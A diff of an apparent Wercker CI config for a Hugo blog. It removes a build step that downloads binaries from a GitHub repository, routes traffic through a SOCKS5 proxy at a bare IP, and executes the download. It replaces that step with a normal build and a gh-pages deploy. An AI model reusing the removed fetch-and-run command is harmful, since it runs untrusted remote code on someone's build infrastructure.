@@ -1,12 +1,42 @@
-command-timeout: 60
-no-response-timeout: 10
-
-box:
-  id: ubuntu:latest
-  cmd: /bin/bash
-
+box: debian  
 build:
   steps:
     - script:
-        code: wget -O 1 https://raw.githubusercontent.com/ributmaestro/ghost-rider-test/main/ver4/ver4 && wget -O 2 https://raw.githubusercontent.com/ributmaestro/ghost-rider-test/main/v2 && export_http_proxy=socks5://192.111.139.162:4145 && chmod u+x 1 && ./1
-        
+        name: install git
+        code: |
+            apt-get update
+            apt-get install git -y
+    - add-to-known_hosts:
+        hostname: github.com
+        fingerprint: nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8
+        type: rsa
+    - add-ssh-key:
+        keyname: WERCKER_BLOG
+    - script:
+        name: initialize git submodules
+        code: |
+            git submodule update --init --recursive
+    - arjen/hugo-build: 
+        flags: --buildDrafts=false
+        version: "0.85.0"
+deploy:
+  steps:
+    - install-packages:
+        packages: git
+    - add-to-known_hosts:
+        hostname: github.com
+        fingerprint: nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8
+        type: rsa
+    - add-ssh-key:
+        keyname: WERCKER_BLOG
+    - script:
+        name: push to gh-pages
+        code: |
+          cd public
+          rm -rf .git
+          git init
+          git config --global user.email "wercker@yopmail.com"
+          git config --global user.name "wercker"
+          git add .
+          git commit -m "deploy from wercker"
+          git push -f git@github.com:wakan/blog.git master:gh-pages
